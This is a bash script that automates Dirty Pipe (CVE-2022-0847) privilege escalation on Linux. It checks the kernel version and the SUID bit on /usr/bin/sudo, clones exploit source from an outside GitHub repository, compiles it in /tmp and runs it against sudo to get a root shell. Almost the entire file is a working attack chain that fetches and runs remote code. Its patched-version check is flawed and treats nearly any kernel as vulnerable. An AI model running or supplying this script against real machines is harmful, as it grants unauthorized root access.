#!/bin/bash
#
# Dirty Pipe (CVE-2022-0847) Privilege Escalation Automation Bash Script

# Array containing non-vulnerable/patched kernel versions
notvulnerable=(4.9 5.8 5.10.102 5.14.10 5.15.25 5.15.34 5.16.11 5.16.12 5.17)

# Get kernel version of system
echo "[*] Checking if kernel version is vulnerable to Dirty Pipe..."
kernel_version=$(uname -r | cut -d '-' -f1)
echo "[*] Kernel version = $kernel_version"

# Checks if the kernel version is vulnerable to Dirty Pipe
if [[ "${notvulnerable[*]}" = $kernel_version ]]; 
    then
        # If not vulnerable, terminate the script
        echo "[!] This kernel version is not vulnerable to Dirty Pipe! Terminating script..."
        exit 0
    else
        echo "[+] This kernel version is vulnerable to Dirty Pipe!"

        # Checks if /usr/bin/sudo has SUID bit set
        echo "[*] Checking if SUID bit is set on /usr/bin/sudo..."
        if [[ "$(find / -perm -4000 2>/dev/null)" =~ "/usr/bin/sudo" ]];
            then
                echo "[+] SUID bit is set on /usr/bin/sudo!"

                # Clone the GitHub repository where exploit code is stored to /tmp directory
                echo "[*] Grabbing a copy of the exploit from GitHub..."
                cd /tmp && git clone https://github.com/Lyc4on/ICT3204.git &> /dev/null
                echo "[+] GitHub repository cloned!"
                
                # Compile exploit and set execute permission on the executable
                echo "[*] Compiling exploit..."
                cd ICT3204/Attacks/Privilege_Escalation && gcc CVE-2022-0847.c -o CVE-2022-0847
                chmod +x CVE-2022-0847
                echo "[+] Exploit successfully compiled and execute permission set!"

                # Execute the exploit to get a root shell and run commands. Perform cleanup at the end.
                echo "[*] Executing the Dirty Pipe exploit and running commands in root shell..."
                echo "whoami && rm /tmp/sh" | ./CVE-2022-0847 /usr/bin/sudo
                echo "[+] All commands have been executed!"

            else
                # If SUID bit is not set on /usr/bin/sudo, terminate the script
                echo "[!] SUID bit is not set on /usr/bin/sudo! Terminating script..."
                exit 0
        
        fi
fi